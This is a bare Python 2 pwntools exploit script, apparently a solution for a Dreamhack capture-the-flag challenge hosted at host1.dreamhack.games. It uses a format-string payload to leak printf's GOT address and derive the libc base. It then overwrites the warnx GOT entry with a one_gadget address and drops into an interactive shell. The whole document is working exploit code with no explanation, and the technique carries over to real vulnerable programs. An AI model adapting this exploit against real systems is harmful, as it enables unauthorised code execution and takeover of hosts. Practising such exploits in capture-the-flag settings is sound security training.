from pwn import *
context.log_level = 'debug'
def send_payload(payload):
    print r.sendline(payload)

r = remote("host1.dreamhack.games", 8377)
libc = ELF('./libc.so.6')
e = ELF('./string')

printf_got = e.got['printf']
warnx_got = e.got['warnx']
printf_offset = libc.symbols['printf']
one_gadget = 0x3a80c
payload = ""
payload += p32(printf_got)
payload += '%x%x%x%x.%s'

print r.recvuntil("> ")
r.sendline("1")
print r.recvuntil("Input: ")
r.sendline(payload)
print r.recvuntil("> ")
r.sendline("2")
print r.recvuntil(".")
printf_libc = u32(r.recv(4))
print hex(printf_libc)
libc_base = printf_libc - printf_offset
one_gadget_libc = libc_base + one_gadget

fmt = FmtStr(send_payload, offset = 5)

print r.recvuntil('> ')
r.sendline('1')
print r.recvuntil('Input: ')

fmt.write(warnx_got, one_gadget_libc)
fmt.execute_writes()

print hex(one_gadget_libc)
print r.recvuntil('> ')
r.sendline('2')
print r.recvuntil('> ')
r.sendline('2')
r.interactive()

